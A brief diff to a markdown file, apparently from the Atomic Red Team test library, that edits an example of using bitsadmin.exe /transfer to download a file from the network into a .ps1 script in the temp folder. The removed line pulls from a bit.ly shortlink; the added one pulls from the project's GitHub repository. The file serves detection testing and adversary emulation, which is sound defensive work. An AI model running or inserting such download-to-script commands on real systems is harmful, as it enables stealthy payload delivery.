@@ -1,5 +1,3 @@
-## bitsadmin.exe
+### bitsadmin.exe
 
-Input:
-
-    bitsadmin.exe  /transfer /Download http://bit.ly/L3g1tCrad1e Default_File_Path.ps1
+    bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Execution/Bitsadmin.md $env:TEMP\AtomicRedTeam\bitsadmin_flag.ps1
